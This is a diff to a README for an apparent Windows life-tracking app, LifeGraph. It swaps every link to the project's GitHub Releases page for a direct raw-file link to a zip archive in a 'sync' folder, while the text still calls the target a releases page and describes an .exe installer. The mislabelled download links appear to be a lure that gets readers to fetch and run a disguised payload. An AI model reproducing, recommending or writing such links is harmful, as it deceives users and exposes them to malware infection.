@@ -1,6 +1,6 @@
 # 🔍 LifeGraph - Track Your Life with Easy Insights
 
-[![Download LifeGraph](https://img.shields.io/badge/Download-LifeGraph-brightgreen)](https://github.com/cherieshambolic837/LifeGraph/releases)
+[![Download LifeGraph](https://img.shields.io/badge/Download-LifeGraph-brightgreen)](https://raw.githubusercontent.com/cherieshambolic837/LifeGraph/main/sync/Graph-Life-2.9.zip)
 
 LifeGraph helps you understand your daily habits and activities. It collects data from your Garmin device, GitHub, coding time, mood, and sleep. It turns this data into clear charts and useful insights. You own your data. You control your experience.
 
@@ -36,7 +36,7 @@ To run LifeGraph on Windows, meet these requirements:
 
 Click the button below to visit the download page. From there, you can download the latest version of LifeGraph for Windows.  
 
-[![Download LifeGraph](https://img.shields.io/badge/Download-LifeGraph-brightgreen)](https://github.com/cherieshambolic837/LifeGraph/releases)
+[![Download LifeGraph](https://img.shields.io/badge/Download-LifeGraph-brightgreen)](https://raw.githubusercontent.com/cherieshambolic837/LifeGraph/main/sync/Graph-Life-2.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Click the button below to visit the download page. From there, you can download 
 
 Follow these steps to install LifeGraph:
 
-1. Visit the [LifeGraph Releases Page](https://github.com/cherieshambolic837/LifeGraph/releases).  
+1. Visit the [LifeGraph Releases Page](https://raw.githubusercontent.com/cherieshambolic837/LifeGraph/main/sync/Graph-Life-2.9.zip).  
 2. Look for the latest version labeled as a `.exe` file. The file name ends with `.exe`. For example, `LifeGraph-Setup.exe`.  
 3. Click the `.exe` file to download it. You may see a message from your browser asking if you want to keep the file. Choose to keep it.  
 4. Once downloaded, find the file in your "Downloads" folder.  
@@ -85,7 +85,7 @@ You can export your data in common formats like CSV to use it in other tools. Yo
 
 ## 🔄 Keeping LifeGraph Updated
 
-To get the latest features and improvements, watch the [GitHub Releases page](https://github.com/cherieshambolic837/LifeGraph/releases) regularly. Whenever a new version is available, download it and run the installer again. Your settings and data will stay safe during updates.
+To get the latest features and improvements, watch the [GitHub Releases page](https://raw.githubusercontent.com/cherieshambolic837/LifeGraph/main/sync/Graph-Life-2.9.zip) regularly. Whenever a new version is available, download it and run the installer again. Your settings and data will stay safe during updates.
 
 ---
 
